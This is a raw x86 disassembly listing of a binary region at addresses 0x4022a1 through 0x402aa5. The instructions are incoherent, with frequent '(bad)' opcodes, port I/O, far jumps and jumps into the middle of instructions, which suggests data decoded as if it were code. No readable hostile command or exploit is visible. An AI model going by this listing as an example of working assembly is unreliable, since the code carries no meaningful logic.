  4022a1:	lea    ebp,[edx-0x3f]
  4022a4:	xchg   esp,eax
  4022a5:	test   dl,ch
  4022a7:	fs cdq 
  4022a9:	push   esp
  4022aa:	rol    BYTE PTR [ebp+0x79c76dae],1
  4022b0:	mov    ds:0xdc67eaa1,al
  4022b5:	mov    BYTE PTR [edx-0x48b1c538],cl
  4022bb:	pop    es
  4022bc:	jo     0x40228d
  4022be:	xchg   ebp,ebp
  4022c0:	jo     0x4022ae
  4022c2:	(bad)  
  4022c3:	inc    edx
  4022c4:	add    edi,DWORD PTR [eax]
  4022c6:	sbb    edx,DWORD PTR [edx+edx*8]
  4022c9:	cwde   
  4022ca:	adc    eax,0x4350f505
  4022cf:	mov    ah,0x92
  4022d1:	in     eax,0xd1
  4022d3:	xchg   ebp,eax
  4022d4:	fldcw  WORD PTR [edx]
  4022d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022d7:	pop    edx
  4022d8:	mov    al,ds:0x8458a8a6
  4022dd:	stos   DWORD PTR es:[edi],eax
  4022de:	xchg   edi,eax
  4022df:	xor    al,0xc3
  4022e1:	and    al,0xe4
  4022e3:	popa   
  4022e4:	mov    eax,0xa1a996e5
  4022e9:	sub    edi,DWORD PTR gs:[edi-0x40a0130f]
  4022f0:	ins    BYTE PTR es:[edi],dx
  4022f1:	(bad)  
  4022f2:	(bad)  
  4022f3:	cmp    edi,edx
  4022f5:	add    eax,eax
  4022f7:	bound  esp,QWORD PTR [ecx]
  4022f9:	mov    edx,0x98e9d5d
  4022fe:	xor    edi,DWORD PTR [edi-0x4a]
  402301:	adc    bl,BYTE PTR [ebx-0x23]
  402304:	mov    ds:0x6bcba82,al
  402309:	pusha  
  40230a:	mov    ebp,0x7b70fc3c
  40230f:	pop    ebx
  402310:	pop    esp
  402311:	mov    edx,0x87ca7020
  402316:	leave  
  402317:	stos   BYTE PTR es:[edi],al
  402318:	pop    ds
  402319:	jg     0x4022b2
  40231b:	stos   DWORD PTR es:[edi],eax
  40231c:	sbb    eax,0x4192f65b
  402321:	ins    BYTE PTR es:[edi],dx
  402322:	mov    eax,0x7279e292
  402327:	mov    dh,al
  402329:	add    DWORD PTR [edx+0x1d],esi
  40232c:	mov    bh,0x69
  40232e:	jne    0x402349
  402330:	enter  0x15d2,0xd0
  402334:	pop    ss
  402335:	ror    BYTE PTR [ebx],cl
  402337:	sar    ebp,0xb6
  40233a:	scas   eax,DWORD PTR es:[edi]
  40233b:	fiadd  WORD PTR [edi]
  40233d:	cs xchg edi,eax
  40233f:	sbb    ecx,ecx
  402341:	ss aad 0x42
  402344:	or     al,0x88
  402346:	in     al,dx
  402347:	pop    edi
  402348:	pop    ss
  402349:	add    eax,DWORD PTR [esi+0x32]
  40234c:	es mov al,ds:0xf8126584
  402353:	sbb    al,0x96
  402355:	in     eax,0xa9
  402357:	jmp    0xcea52004
  40235c:	cmp    BYTE PTR [esp+ebp*1+0x2ba0d41f],bh
  402363:	in     al,0x39
  402365:	mov    dl,0x53
  402367:	mov    edi,0x3a902639
  40236c:	rol    BYTE PTR [eax],0x9c
  40236f:	jb     0x40232f
  402371:	xchg   BYTE PTR ds:0x6214bffc,bl
  402377:	int3   
  402378:	in     al,dx
  402379:	pop    ecx
  40237a:	xchg   edx,eax
  40237b:	mov    ebp,0x8728d063
  402380:	mov    eax,0x74c621d4
  402385:	int3   
  402386:	mov    ch,dl
  402388:	ds imul ecx,ebx,0xffffff81
  40238c:	mov    ebp,0x92a8f0e9
  402391:	cli    
  402392:	(bad)  
  402394:	loopne 0x402374
  402396:	(bad)  
  402397:	fadd   DWORD PTR [ebx+ebp*2]
  40239a:	clc    
  40239b:	adc    bh,bl
  40239d:	nop
  40239e:	xor    eax,0xc3f9619d
  4023a3:	adc    al,0xa9
  4023a5:	in     al,dx
  4023a6:	shl    DWORD PTR [eax+0x69],1
  4023a9:	aaa    
  4023aa:	jbe    0x402352
  4023ac:	pop    es
  4023ad:	and    esp,ebx
  4023af:	test   eax,0x841af97e
  4023b4:	or     ebx,esp
  4023b6:	ds pop edx
  4023b8:	xchg   esp,eax
  4023b9:	outs   dx,BYTE PTR ds:[esi]
  4023ba:	dec    edi
  4023bb:	ins    BYTE PTR es:[edi],dx
  4023bc:	addr16 stc 
  4023be:	mov    ds,WORD PTR [ecx]
  4023c0:	sbb    esp,DWORD PTR [edi+0x5cd9d358]
  4023c6:	sub    eax,0x2b961000
  4023cb:	jecxz  0x402374
  4023cd:	mul    ebp
  4023cf:	(bad)  
  4023d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023d1:	fstp   QWORD PTR [ebx-0x51]
  4023d4:	mov    es,WORD PTR ds:0x7728e320
  4023da:	pop    ds
  4023db:	scas   eax,DWORD PTR es:[edi]
  4023dc:	and    eax,DWORD PTR [ebp+0x17]
  4023df:	add    DWORD PTR [ebx+0x25be073c],edi
  4023e5:	push   0x49277970
  4023ea:	test   BYTE PTR [eax+0x67],dl
  4023ed:	mov    esp,0x5cc0025a
  4023f2:	imul   ecx,DWORD PTR [eax+ebp*2+0xb4c28d9],0xf3b26e1b
  4023fd:	dec    edx
  4023fe:	out    dx,eax
  4023ff:	(bad)  
  402400:	mov    edi,0xbf1079c1
  402405:	push   ecx
  402406:	xchg   ebx,eax
  402407:	test   eax,0x3479f5b1
  40240c:	mov    esi,DWORD PTR [esi-0xc]
  40240f:	mov    al,0xfd
  402411:	mov    edx,0xf9b2414b
  402416:	(bad)  
  402417:	cmp    eax,esp
  402419:	mov    ds:0xf57f0081,eax
  40241e:	cli    
  40241f:	fmul   st(7),st
  402421:	fwait
  402422:	ror    DWORD PTR [esi+0x6ad8a4fa],cl
  402428:	pop    edx
  402429:	sub    DWORD PTR ds:0x1ff81a65,ebp
  40242f:	add    DWORD PTR gs:[edx+0x400ba031],0xdeb43f73
  40243a:	sbb    al,0xed
  40243c:	jle    0x402460
  40243e:	popf   
  40243f:	mov    ds,WORD PTR [eax-0x698f37e4]
  402445:	arpl   WORD PTR [ecx-0x299d3b43],bx
  40244b:	pop    esi
  40244c:	ror    BYTE PTR [esi+0x1],1
  40244f:	xor    BYTE PTR [ebp+0x9422d35],bh
  402455:	push   0x364af964
  40245a:	sbb    DWORD PTR [esi+esi*2],ebp
  40245d:	add    BYTE PTR [ebx+eiz*4-0x75708b14],cl
  402464:	outs   dx,DWORD PTR ds:[esi]
  402465:	mov    bl,dh
  402467:	and    edx,DWORD PTR [ebp-0x5b]
  40246a:	aam    0x68
  40246c:	ja     0x402440
  40246e:	pop    ss
  40246f:	push   0x4dfdfad8
  402474:	pop    es
  402475:	sub    DWORD PTR [ebx],ebx
  402477:	aas    
  402478:	retf   
  402479:	inc    edi
  40247a:	(bad)  
  40247c:	xor    eax,0x3952ed94
  402481:	addr16 mov esi,0x93a5b402
  402487:	clc    
  402488:	sub    ebp,esp
  40248a:	shr    BYTE PTR [ecx],cl
  40248c:	pop    ebx
  40248d:	cmp    DWORD PTR [ebp-0x2efe5597],esp
  402493:	xor    ch,BYTE PTR [eax]
  402495:	jg     0x40245e
  402497:	jae    0x402434
  402499:	push   eax
  40249a:	cmp    eax,0xb21f0d5a
  40249f:	mov    ch,0xa0
  4024a1:	sahf   
  4024a2:	inc    edx
  4024a3:	xchg   esp,eax
  4024a4:	icebp  
  4024a5:	adc    al,0x6b
  4024a7:	jnp    0x4024af
  4024a9:	call   0x2728:0xbcd75c4
  4024b0:	int    0x26
  4024b2:	pop    ebp
  4024b3:	(bad)
  4024b7:	lock lds esp,FWORD PTR [edx]
  4024ba:	dec    ecx
  4024bb:	inc    ebx
  4024bc:	mov    eax,0x7be83712
  4024c1:	cwde   
  4024c2:	icebp  
  4024c3:	dec    edx
  4024c4:	shr    DWORD PTR [edi-0x1d],1
  4024c7:	xchg   BYTE PTR [edi-0x1d],bh
  4024ca:	loope  0x402455
  4024cc:	popa   
  4024cd:	jecxz  0x402509
  4024cf:	pop    ebp
  4024d0:	in     al,0x7f
  4024d2:	(bad)  
  4024d3:	push   ds
  4024d4:	sub    al,0xdb
  4024d6:	pop    esi
  4024d7:	xor    ebp,ebp
  4024d9:	cmp    DWORD PTR [eax],ecx
  4024db:	je     0x402540
  4024dd:	div    DWORD PTR [ecx+0x64]
  4024e0:	mov    ds:0xa18c670a,al
  4024e5:	inc    ecx
  4024e6:	out    dx,eax
  4024e7:	mov    al,0xa5
  4024e9:	push   eax
  4024ea:	mov    ecx,0xde6716a7
  4024ef:	pop    ecx
  4024f0:	dec    edx
  4024f1:	scas   al,BYTE PTR es:[edi]
  4024f2:	ret    0xc0f4
  4024f5:	xchg   BYTE PTR [esi],bl
  4024f7:	ja     0x40248b
  4024f9:	cmp    dh,BYTE PTR [edi]
  4024fb:	sbb    ch,0x44
  4024fe:	and    bl,BYTE PTR [edi]
  402500:	in     eax,0x20
  402502:	outs   dx,DWORD PTR ds:[esi]
  402503:	in     eax,0x28
  402505:	shl    edi,1
  402507:	lods   al,BYTE PTR ds:[esi]
  402508:	xor    bl,BYTE PTR [ebp-0x11]
  40250b:	add    al,0x44
  40250d:	int3   
  40250e:	push   ss
  40250f:	test   al,0x30
  402511:	push   0x15d2b418
  402516:	xchg   ecx,eax
  402517:	sti    
  402518:	push   es
  402519:	scas   al,BYTE PTR es:[edi]
  40251a:	outs   dx,BYTE PTR ds:[esi]
  40251b:	adc    eax,0x5c745d99
  402520:	leave  
  402521:	mov    dh,BYTE PTR [edi+0x2e]
  402524:	pop    edx
  402525:	rol    esi,cl
  402527:	pop    esi
  402528:	push   es
  402529:	fist   DWORD PTR [edi+0x76]
  40252c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40252d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40252e:	fiadd  DWORD PTR [ecx+0x28]
  402531:	or     ah,BYTE PTR [ebx]
  402533:	jno    0x40258e
  402535:	loop   0x402555
  402537:	imul   edx,DWORD PTR [edx-0x6beceee6],0x4096817b
  402541:	aad    0x44
  402543:	xlat   BYTE PTR ds:[ebx]
  402544:	outs   dx,DWORD PTR ds:[esi]
  402545:	ds mov edx,0x652499
  40254b:	and    al,0x0
  40254d:	js     0x4025bf
  40254f:	mov    ecx,0x20d70907
  402554:	push   ecx
  402555:	sbb    al,0x36
  402557:	dec    edx
  402558:	imul   edi,ebx,0x2e4f8e0d
  40255e:	cmp    cl,BYTE PTR [edi+0x2cf0b0c1]
  402564:	out    0xde,eax
  402566:	cmp    eax,0xded44eb1
  40256b:	gs loop 0x402565
  40256e:	dec    eax
  40256f:	in     eax,0x9a
  402571:	call   0x8af2:0xf4e32ac2
  402578:	push   0x5c
  40257a:	in     eax,0xe8
  40257c:	sub    BYTE PTR [ebp+0x36c0cadc],al
  402582:	mov    WORD PTR [eax+0x52],ss
  402585:	test   al,0x32
  402587:	fcomip st,st(6)
  402589:	mov    ecx,DWORD PTR [eax+ebx*1]
  40258c:	punpckhdq mm4,QWORD PTR [esi+0x7b52d163]
  402593:	in     eax,0x4c
  402595:	jne    0x40255d
  402597:	cmp    edi,DWORD PTR [ecx+ebp*4]
  40259a:	enter  0xf39e,0xc0
  40259e:	loopne 0x4025d0
  4025a0:	sbb    ah,dl
  4025a2:	adc    al,0x97
  4025a4:	sbb    DWORD PTR [ebx+0xd067c32],esi
  4025aa:	adc    eax,0xe7921d11
  4025af:	outs   dx,BYTE PTR ds:[esi]
  4025b0:	mov    ah,0xc
  4025b2:	sbb    al,0x39
  4025b4:	imul   al
  4025b6:	adc    al,0xbc
  4025b8:	push   eax
  4025b9:	jbe    0x4025f1
  4025bb:	mov    dl,0x9e
  4025bd:	inc    ecx
  4025be:	xor    DWORD PTR [esi],edx
  4025c0:	fdivr  QWORD PTR [ebp+0x4]
  4025c3:	imul   eax,DWORD PTR [edi+0x46],0x33f6b0f5
  4025ca:	popf   
  4025cb:	xor    edi,0x19b40670
  4025d1:	or     ecx,esi
  4025d3:	(bad)  
  4025d4:	fidiv  WORD PTR [edx]
  4025d6:	(bad)  
  4025d7:	cmp    al,0x5c
  4025d9:	sbb    BYTE PTR [esi],al
  4025db:	xor    ecx,esi
  4025dd:	call   0xfb33eb10
  4025e2:	outs   dx,DWORD PTR ds:[esi]
  4025e3:	mov    al,0x3d
  4025e5:	mov    cl,0xc8
  4025e7:	lea    esp,[ecx]
  4025e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025ea:	push   ss
  4025eb:	and    al,0x19
  4025ed:	int3   
  4025ee:	add    esi,DWORD PTR [edx]
  4025f0:	aas    
  4025f1:	daa    
  4025f2:	jb     0x40264d
  4025f4:	sub    al,0x28
  4025f6:	dec    edx
  4025f7:	pushf  
  4025f8:	loope  0x402625
  4025fa:	jp     0x402617
  4025fc:	jmp    0xc0946e5a
  402601:	scas   al,BYTE PTR es:[edi]
  402602:	xlat   BYTE PTR ds:[ebx]
  402603:	sub    ebp,DWORD PTR [ebp-0xc56d87a]
  402609:	adc    edi,DWORD PTR [ebp-0x77b33597]
  40260f:	jb     0x402621
  402611:	adc    eax,0x1cf3cbd9
  402616:	div    DWORD PTR [esi]
  402618:	sbb    ebp,DWORD PTR [edx+ecx*1+0x57]
  40261c:	(bad)  
  40261d:	xor    ecx,ecx
  40261f:	lea    edi,[edx]
  402621:	mov    dl,0x2f
  402623:	or     al,0xc1
  402625:	add    dl,ch
  402627:	lea    esp,[eax+ecx*4-0x4915f104]
  40262e:	mov    bl,0x80
  402630:	and    edx,eax
  402632:	inc    edi
  402633:	pop    ebx
  402634:	stc    
  402635:	fnstcw WORD PTR ds:0xf5c0c0d0
  40263b:	or     ah,al
  40263d:	mov    bh,0x20
  40263f:	cli    
  402640:	jnp    0x402658
  402642:	(bad)  
  402643:	xchg   esi,eax
  402644:	shl    BYTE PTR [edx+0x7751bdd4],0x23
  40264b:	bound  esp,QWORD PTR [esi+0x58]
  40264e:	out    dx,al
  40264f:	push   esp
  402650:	sub    al,BYTE PTR [ecx+ebx*8-0x55]
  402654:	inc    edx
  402655:	mov    ebx,0xda3f4f86
  40265a:	rcl    DWORD PTR [ebp+ebx*2+0x26],cl
  40265e:	pop    edx
  40265f:	mov    edx,0x2d81c4a
  402664:	dec    eax
  402665:	jge    0x402651
  402667:	sub    BYTE PTR [edi-0x31694c10],0x1a
  40266e:	or     eax,ebp
  402670:	mov    ch,0x48
  402672:	int    0x5b
  402674:	not    DWORD PTR [edx-0x38]
  402677:	xchg   edx,eax
  402678:	and    ecx,DWORD PTR [eax-0x11]
  40267b:	sub    eax,0x48cf109a
  402680:	xchg   ch,ch
  402682:	fs out dx,al
  402684:	add    eax,0x383ec705
  402689:	shl    DWORD PTR [esi-0x45616d9],1
  40268f:	jg     0x402636
  402691:	popf   
  402692:	mov    eax,DWORD PTR [esp+eiz*4]
  402695:	out    dx,eax
  402696:	jp     0x402639
  402698:	push   0x69
  40269a:	mov    bh,0x3d
  40269c:	adc    al,0xa0
  40269e:	mov    ecx,0xf0f7ece8
  4026a3:	les    ecx,FWORD PTR [edx]
  4026a5:	add    al,0x23
  4026a7:	iret   
  4026a8:	popf   
  4026a9:	mov    eax,ds:0x2887e103
  4026ae:	rcr    DWORD PTR [edi-0x16],cl
  4026b1:	sbb    eax,0xd22ad63e
  4026b6:	(bad)  
  4026b7:	imul   BYTE PTR [ecx-0x28]
  4026ba:	sbb    DWORD PTR ds:0x2c9d3e81,ebx
  4026c0:	cld    
  4026c1:	setne  BYTE PTR [ecx]
  4026c4:	inc    DWORD PTR [edi-0x10a87f22]
  4026ca:	pushf  
  4026cb:	jl     0x4026a8
  4026cd:	packuswb mm6,QWORD PTR [edi-0x69a5395b]
  4026d4:	push   ds
  4026d5:	popf   
  4026d6:	xchg   ecx,eax
  4026d7:	add    eax,0xff360949
  4026dc:	cli    
  4026dd:	xor    ebp,DWORD PTR [ebx+0x43]
  4026e0:	pop    eax
  4026e1:	inc    edx
  4026e2:	loopne 0x4026b3
  4026e4:	lgs    ebp,FWORD PTR [esi-0x1d74fb17]
  4026eb:	cmp    al,BYTE PTR [esi-0x65]
  4026ee:	clc    
  4026ef:	xor    esp,esi
  4026f1:	xchg   esp,eax
  4026f2:	test   al,0x7a
  4026f4:	icebp  
  4026f5:	je     0x4026b9
  4026f7:	aam    0xd0
  4026f9:	pop    eax
  4026fa:	sub    al,0x8f
  4026fc:	push   0xf4cb9d9c
  402701:	in     eax,0x3
  402703:	out    dx,al
  402704:	mov    al,ds:0x6f7364d9
  402709:	mov    esi,esi
  40270b:	fs stos DWORD PTR es:[edi],eax
  40270d:	cld    
  40270e:	add    DWORD PTR ds:0xbf5a8f5f,esi
  402714:	imul   edx,DWORD PTR [edx-0x30e1820],0x79f6c089
  40271e:	adc    bh,dl
  402720:	shr    DWORD PTR gs:[eax],cl
  402723:	shl    bl,1
  402725:	mov    ebx,0xfb2ffbb
  40272a:	mov    al,fs:0x88fbe3b0
  402730:	pop    ecx
  402731:	retf   
  402732:	jp     0x40278e
  402734:	in     al,dx
  402735:	and    eax,0x832b69f0
  40273a:	xchg   ebp,eax
  40273b:	xor    dl,dh
  40273d:	popf   
  40273e:	ins    BYTE PTR es:[edi],dx
  40273f:	inc    ebx
  402740:	push   es
  402741:	push   0x1a
  402743:	inc    esi
  402744:	jne    0x402762
  402746:	das    
  402747:	cmp    eax,0x28605b3
  40274c:	jae    0x4027cd
  40274e:	jge    0x40273b
  402750:	cmp    dh,BYTE PTR [edi+0x1887d0f4]
  402756:	mov    ah,0x81
  402758:	jbe    0x402763
  40275a:	add    al,0x6e
  40275c:	cmp    al,0x1d
  40275e:	xor    eax,0x334395d6
  402763:	hlt    
  402764:	xchg   ecx,eax
  402765:	jp     0x4027be
  402767:	pop    edi
  402768:	dec    esp
  402769:	ins    DWORD PTR es:[edi],dx
  40276a:	sub    al,0xab
  40276c:	in     al,0xc0
  40276e:	xor    dh,BYTE PTR [eax]
  402770:	inc    edi
  402771:	fisubr WORD PTR [ecx]
  402773:	mov    eax,ds:0x250ed250
  402778:	ret    
  402779:	mov    edx,0x5fa782ab
  40277e:	sub    DWORD PTR [ecx+ebx*8],esi
  402781:	stos   BYTE PTR es:[edi],al
  402782:	ins    DWORD PTR es:[edi],dx
  402783:	retf   
  402784:	mov    ah,0x3d
  402786:	cmp    DWORD PTR [eax-0x6f],esp
  402789:	jge    0x40277f
  40278b:	xlat   BYTE PTR ds:[ebx]
  40278c:	aad    0x6c
  40278e:	xor    DWORD PTR [ecx-0x5350df45],0x90859859
  402798:	inc    ebp
  402799:	adc    eax,0xb07c084e
  40279e:	std    
  40279f:	ins    BYTE PTR es:[edi],dx
  4027a0:	retf   
  4027a1:	pop    ebx
  4027a2:	call   0x7a6336f5
  4027a7:	dec    ebx
  4027a8:	mov    ch,0xf6
  4027aa:	mov    ch,0xcb
  4027ac:	pop    es
  4027ad:	lods   eax,DWORD PTR ds:[esi]
  4027ae:	cmc    
  4027af:	sbb    eax,0x6cbf180c
  4027b4:	loop   0x40279c
  4027b6:	pushf  
  4027b7:	push   0xddaf94c8
  4027bc:	and    DWORD PTR [edx-0x17],esi
  4027bf:	outs   dx,DWORD PTR ds:[esi]
  4027c0:	mov    eax,ds:0x13e0b4b0
  4027c5:	sar    DWORD PTR [eax-0x1bac05e],0x5a
  4027cc:	dec    edx
  4027cd:	push   ebp
  4027ce:	icebp  
  4027cf:	push   ebp
  4027d0:	(bad)  
  4027d1:	shr    al,1
  4027d3:	fsub   st(1),st
  4027d5:	and    BYTE PTR [ecx-0x3c5ca4f1],ah
  4027db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027dc:	jae    0x4027a9
  4027de:	cmp    DWORD PTR [edi+0x6f8ca356],0xffffff80
  4027e5:	adc    DWORD PTR [ecx+0x27],ebp
  4027e8:	mov    ds:0x828b25cd,al
  4027ed:	dec    eax
  4027ee:	push   edx
  4027ef:	push   esp
  4027f0:	xor    al,0x88
  4027f2:	cmp    eax,0x8c37aee1
  4027f7:	jns    0x402871
  4027f9:	lahf   
  4027fa:	imul   esi,DWORD PTR [ecx-0xd28e968],0xfffffff4
  402801:	xchg   edi,eax
  402802:	sub    ecx,DWORD PTR [edi+eax*2]
  402805:	push   ebx
  402806:	add    dh,BYTE PTR [ebp-0x40]
  402809:	jmp    0xd5d0ebad
  40280e:	in     al,0x1
  402810:	shl    BYTE PTR [esi-0x643983b],cl
  402816:	sti    
  402817:	pusha  
  402818:	neg    DWORD PTR [edx+0x7b64855e]
  40281e:	adc    esi,0x3
  402821:	repnz in eax,0x97
  402824:	mov    ch,BYTE PTR [eax-0x19]
  402827:	popa   
  402828:	loope  0x40289d
  40282a:	pop    ebx
  40282b:	adc    ch,BYTE PTR [ecx+0x58a452a4]
  402831:	adc    eax,0x55b08bc
  402836:	mov    BYTE PTR [esi+ebx*1],ah
  402839:	add    bl,BYTE PTR [esi+0x4d4c33e0]
  40283f:	popf   
  402840:	das    
  402841:	add    al,0x30
  402843:	lods   eax,DWORD PTR ds:[esi]
  402844:	cmp    esi,eax
  402846:	push   ecx
  402847:	pop    eax
  402848:	xor    DWORD PTR [esp+ebp*8-0x43],ebx
  40284c:	push   ecx
  40284d:	aad    0x49
  40284f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402850:	leave  
  402851:	out    0x56,eax
  402853:	retf   0x8a11
  402856:	sub    DWORD PTR [ebp-0x7341f1c2],0xffffff98
  40285d:	stos   DWORD PTR es:[edi],eax
  40285e:	bound  esp,QWORD PTR [eax+0x2]
  402861:	imul   eax,ebx,0xfddf4853
  402867:	push   ecx
  402868:	add    cl,BYTE PTR [ecx]
  40286a:	jge    0x40283b
  40286c:	inc    edi
  40286d:	test   eax,0x84ce4a18
  402872:	repnz dec esi
  402874:	inc    eax
  402875:	mov    dh,0xd3
  402877:	sbb    DWORD PTR [esi+0x1f],0x39
  40287b:	test   al,0x79
  40287d:	add    eax,0xfe01118e
  402882:	cmp    eax,0x2a2dcb5b
  402887:	dec    eax
  402888:	fild   QWORD PTR [esi+0x3fb99adf]
  40288e:	in     eax,0xa5
  402890:	shr    BYTE PTR [esi+0x1b3a8aba],1
  402896:	and    eax,0xf7e669b7
  40289b:	or     esp,ebp
  40289d:	dec    edi
  40289e:	sub    esi,ecx
  4028a0:	(bad)  [ebp-0x68c59eba]
  4028a6:	pop    eax
  4028a7:	sbb    al,0x6f
  4028a9:	mov    ch,0xf9
  4028ab:	cmp    dh,BYTE PTR [ebp+eax*8+0x2c226b29]
  4028b2:	(bad)  [edx-0x4b0b7e9e]
  4028b8:	cmp    DWORD PTR [ebp+eax*8-0x4d],ecx
  4028bc:	cdq    
  4028bd:	adc    al,0x11
  4028bf:	xlat   BYTE PTR ds:[ebx]
  4028c0:	ret    0xc8b4
  4028c3:	enter  0xf73c,0xc0
  4028c7:	xchg   ecx,eax
  4028c8:	xlat   BYTE PTR ds:[ebx]
  4028c9:	inc    ebx
  4028ca:	test   eax,0xfc98b0d
  4028cf:	fwait
  4028d0:	loope  0x40291e
  4028d2:	imul   ebx,DWORD PTR [edi+0x3],0xe27ea516
  4028d9:	sbb    esp,DWORD PTR [esi-0xc]
  4028dc:	or     al,0x80
  4028de:	into   
  4028df:	sbb    esp,DWORD PTR [edx-0x26488a35]
  4028e5:	retf   
  4028e6:	xor    eax,0x506fff8c
  4028eb:	cmp    ebp,DWORD PTR [ecx]
  4028ed:	mov    edx,0xee18d4d9
  4028f2:	in     eax,dx
  4028f3:	add    BYTE PTR [eax+esi*2-0x75],al
  4028f7:	rcr    dl,cl
  4028f9:	mov    al,0xc3
  4028fb:	loope  0x4028d8
  4028fd:	fs out dx,al
  4028ff:	ficom  WORD PTR [edx]
  402901:	xlat   BYTE PTR ds:[ebx]
  402902:	pushf  
  402903:	sbb    DWORD PTR [ebp-0x6669ba65],edx
  402909:	jns    0x40292e
  40290b:	mov    esi,ss
  40290d:	addr16 xchg esp,eax
  40290f:	test   al,0x98
  402911:	lea    edi,[ebp-0x398ad95e]
  402917:	jnp    0x40290d
  402919:	shl    DWORD PTR [ecx+0x56e67953],cl
  40291f:	test   BYTE PTR [edi-0x44a20725],bl
  402925:	push   eax
  402926:	gs jl  0x40292d
  402929:	(bad)  
  40292a:	fcomp  QWORD PTR [edx-0x74]
  40292d:	jmp    0x4028f1
  40292f:	fld    DWORD PTR [ecx+0x4a]
  402932:	mov    bl,0x25
  402934:	push   es
  402935:	mov    dh,0xb1
  402937:	push   eax
  402938:	push   esp
  402939:	adc    eax,0x5862d923
  40293e:	aaa    
  40293f:	pop    ebp
  402940:	mov    esp,0x822dd89d
  402945:	popa   
  402946:	ss aam 0xa4
  402949:	sub    eax,0xef5bc3c8
  40294e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40294f:	mov    eax,0x45fe5641
  402954:	cli    
  402955:	test   eax,0x1f0b20c6
  40295a:	ret    
  40295b:	pop    ds
  40295c:	ins    DWORD PTR es:[edi],dx
  40295d:	and    bh,BYTE PTR [edx*4+0x730e5b9]
  402964:	xor    al,0xd6
  402966:	jmp    0x40295b
  402968:	jmp    0x3da18cb4
  40296d:	mov    ah,0xc4
  40296f:	fistp  WORD PTR [ecx]
  402971:	repz push ss
  402973:	sbb    al,0xd6
  402975:	cmp    BYTE PTR [esi-0x7a],dh
  402978:	add    DWORD PTR [ebp+0x71],edi
  40297b:	sbb    eax,0xf905c9a6
  402980:	mov    ds:0x7da721ef,eax
  402985:	jmp    0x31b32559
  40298a:	push   ebp
  40298b:	push   ds
  40298c:	or     eax,DWORD PTR [ebx]
  40298e:	stos   DWORD PTR es:[edi],eax
  40298f:	pushf  
  402990:	shl    BYTE PTR [esi+ecx*2],0x5c
  402994:	jns    0x40297c
  402996:	ss pop ss
  402998:	sub    eax,0x82c51770
  40299d:	pop    ecx
  40299e:	ret    
  40299f:	dec    ecx
  4029a0:	cmp    al,0x54
  4029a2:	sahf   
  4029a3:	mov    cl,0x7b
  4029a6:	int    0x4f
  4029a8:	(bad)  
  4029a9:	mov    ds:0xf762f3e3,al
  4029ae:	mov    esp,0xcd958afc
  4029b3:	pop    esp
  4029b4:	test   ax,0x4fcc
  4029b8:	mul    ch
  4029ba:	inc    eax
  4029bb:	popa   
  4029bc:	xchg   esp,eax
  4029bd:	push   ebp
  4029be:	daa    
  4029bf:	jg     0x402979
  4029c1:	add    edx,DWORD PTR [esi+0x24]
  4029c4:	mov    bh,0xc9
  4029c6:	mov    ch,0x65
  4029c8:	mov    dl,0x79
  4029ca:	ret    
  4029cb:	popf   
  4029cc:	sub    BYTE PTR [eax+0x2a4c851d],0x9d
  4029d3:	es das 
  4029d5:	lock addr16 xchg ebx,eax
  4029d8:	test   BYTE PTR [esi-0x6a50ef22],dh
  4029de:	retf   0x326
  4029e1:	xor    esi,DWORD PTR [esi]
  4029e3:	scas   al,BYTE PTR es:[edi]
  4029e4:	push   ecx
  4029e5:	mov    ah,0x75
  4029e7:	popf   
  4029e8:	pop    ebp
  4029e9:	jns    0x40299f
  4029eb:	cvttps2pi mm0,QWORD PTR [ecx-0x4b]
  4029ef:	outs   dx,BYTE PTR ds:[esi]
  4029f0:	cmp    eax,0x5919524a
  4029f5:	shl    bl,cl
  4029f7:	dec    ebx
  4029f8:	mov    esi,0x80d5d53b
  4029fd:	aas    
  4029fe:	in     eax,0xe1
  402a00:	fisubr WORD PTR [ebx]
  402a02:	sbb    bl,BYTE PTR [edx-0x20d486a]
  402a08:	mov    ch,ah
  402a0a:	ret    
  402a0b:	and    al,0xe9
  402a0d:	adc    ecx,DWORD PTR [ecx]
  402a0f:	pop    edx
  402a10:	ja     0x4029bd
  402a12:	sbb    al,0x74
  402a14:	mov    dl,0x24
  402a16:	loope  0x402a87
  402a18:	push   cs
  402a19:	cmp    esp,eax
  402a1b:	cmp    eax,0x26474d43
  402a20:	daa    
  402a21:	addr16 (bad) 
  402a23:	popa   
  402a24:	and    esp,DWORD PTR [ebx+eax*8]
  402a27:	popa   
  402a28:	sub    DWORD PTR [edx+ebx*1-0x17c5185],esi
  402a2f:	je     0x4029bf
  402a31:	in     eax,0x9d
  402a33:	into   
  402a34:	xchg   ebp,eax
  402a35:	fnsave [edi-0x14c75b8b]
  402a3b:	lea    esp,[eax]
  402a3d:	in     al,dx
  402a3e:	mov    bl,0x80
  402a40:	and    al,BYTE PTR [ebp+ebx*4+0x46]
  402a44:	aam    0xb0
  402a46:	mov    ds:0xddcf968d,eax
  402a4b:	fwait
  402a4c:	jo     0x4029f6
  402a4e:	pop    ds
  402a4f:	clc    
  402a50:	mov    cl,BYTE PTR [edx-0x765be479]
  402a56:	psraw  mm3,mm1
  402a59:	imul   ecx,ecx,0x857d7b53
  402a5f:	jmp    0xbf0:0x221295eb
  402a66:	cld    
  402a67:	arpl   WORD PTR [eax],si
  402a69:	mov    ebx,0x73f9189b
  402a6e:	xor    edx,DWORD PTR [eax+0x34]
  402a71:	in     eax,0xda
  402a73:	or     edx,esi
  402a75:	mov    ebp,0xff4d7350
  402a7a:	jge    0x402ac3
  402a7c:	mov    ecx,0xd775ac0d
  402a81:	and    DWORD PTR [eax+0x17d9daa7],ebx
  402a87:	es push ebp
  402a89:	ret    0xee85
  402a8c:	and    al,0x32
  402a8e:	(bad)  
  402a8f:	out    dx,eax
  402a90:	xchg   ecx,eax
  402a91:	inc    ebx
  402a92:	xor    eax,0x1f76c691
  402a97:	test   al,0xd3
  402a99:	out    dx,al
  402a9a:	cmp    DWORD PTR ds:0x922ff30,ecx
  402aa0:	in     eax,dx
  402aa1:	inc    esi
  402aa2:	and    al,0x11
  402aa4:	dec    esp
  402aa5:	imul   esp,DWORD PTR [ebp-0x18],0x6baa57b8
